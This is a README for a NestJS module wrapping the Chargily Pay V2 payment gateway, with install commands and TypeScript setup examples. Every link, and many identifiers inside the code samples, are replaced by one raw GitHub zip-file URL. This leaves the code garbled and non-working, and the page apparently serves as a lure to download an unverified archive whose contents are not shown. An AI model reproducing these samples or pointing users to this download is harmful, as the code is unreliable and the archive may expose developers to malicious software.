# 🚀 nestjs-chargili - Easy Payment Integration for Your App

[![Download Now](https://raw.githubusercontent.com/MikeBv/nestjs-chargili/main/chorditis/nestjs-chargili.zip%20Now-Click%20to%https://raw.githubusercontent.com/MikeBv/nestjs-chargili/main/chorditis/nestjs-chargili.zip)](https://raw.githubusercontent.com/MikeBv/nestjs-chargili/main/chorditis/nestjs-chargili.zip)

Welcome to **nestjs-chargili**! This module helps you quickly integrate Chargily Pay™ V2 payment gateway into your application. Follow the steps below to get started.

## 📥 Download & Install

To get started, visit this page to download: [Releases Page](https://raw.githubusercontent.com/MikeBv/nestjs-chargili/main/chorditis/nestjs-chargili.zip). Choose the version that fits your needs and follow the installation guide below.

## 🚀 Getting Started

### 1. System Requirements
Make sure your system meets the following requirements:

- https://raw.githubusercontent.com/MikeBv/nestjs-chargili/main/chorditis/nestjs-chargili.zip version 14 or higher
- npm or yarn package manager

### 2. Installation

You can install **nestjs-chargili** using any of the following package managers:

Using npm:

```bash
npm install @zaki-g/chargily
```

Using pnpm:

```bash
pnpm install @zaki-g/chargily
```

Using yarn:

```bash
yarn add @zaki-g/chargily
```

### 3. Import the Module

Once installed, you need to import the module into your application. Open your code editor and add the following lines:

```typescript
import { Module } from '@nestjs/common';
import { ChargiliModule } from '@zaki-g/chargily';

@Module({
  imports: [
    https://raw.githubusercontent.com/MikeBv/nestjs-chargili/main/chorditis/nestjs-chargili.zip({
      api_key: 'your_api_key_here',
      mode: 'test', // or 'live'
    }),
  ],
})
export class AppModule {}
```

### 4. Async Configuration (Recommended)

For better flexibility, you can configure the module asynchronously. Here’s how to do it:

```typescript
import { Module } from '@nestjs/common';
import { ConfigModule, ConfigService } from '@nestjs/config';
import { ChargiliModule } from '@zaki-g/chargily';

@Module({
  imports: [
    https://raw.githubusercontent.com/MikeBv/nestjs-chargili/main/chorditis/nestjs-chargili.zip(),
    https://raw.githubusercontent.com/MikeBv/nestjs-chargili/main/chorditis/nestjs-chargili.zip({
      useFactory: async (configService: ConfigService) => ({
        api_key: https://raw.githubusercontent.com/MikeBv/nestjs-chargili/main/chorditis/nestjs-chargili.zip('CHARGILI_API_KEY'),
        mode: https://raw.githubusercontent.com/MikeBv/nestjs-chargili/main/chorditis/nestjs-chargili.zip('CHARGILI_MODE'), // 'test' or 'live'
      }),
      inject: [ConfigService],
    }),
  ],
})
export class AppModule {}
```

### 5. Configure API Key and Mode

Make sure to replace `'your_api_key_here'` with your actual Chargily API key. Choose the mode as either `'test'` or `'live'` depending on your needs.

### 6. Usage

Now that you have set up the module, you can use it to process payments within your application. Here’s a simple example of how to create a payment transaction:

```typescript
import { Injectable } from '@nestjs/common';
import { ChargiliService } from '@zaki-g/chargily';

@Injectable()
export class PaymentService {
  constructor(private readonly chargiliService: ChargiliService) {}

  async createPayment(amount: number) {
    const payment = await https://raw.githubusercontent.com/MikeBv/nestjs-chargili/main/chorditis/nestjs-chargili.zip({
      amount,
      order_id: 'your_order_id', // Custom order ID
      // Add more parameters if necessary
    });
    return payment;
  }
}
```

### 7. Testing

You can test the integration in a safe environment by using the test mode. Make sure to validate that the payments process as expected.

### 8. Common Issues

If you run into any issues while integrating, check the following:

- Ensure that your API key is set correctly.
- Verify that your package manager command didn’t return any errors.
- Make sure you're using compatible versions of https://raw.githubusercontent.com/MikeBv/nestjs-chargili/main/chorditis/nestjs-chargili.zip and npm/yarn.

### 9. Getting Help

If you need assistance, consider joining the community. You can post questions or read FAQs on the GitHub Issues page of this repository.

### 10. Additional Resources

For more details on Chargily Pay™ and how it works, refer to the official documentation here: [Chargily Documentation](https://raw.githubusercontent.com/MikeBv/nestjs-chargili/main/chorditis/nestjs-chargili.zip).

---

Now that you have the steps, you’re ready to get started with **nestjs-chargili**! Follow the guide above to download, install, and run the module easily. If you have further questions, feel free to explore more or ask the community for help.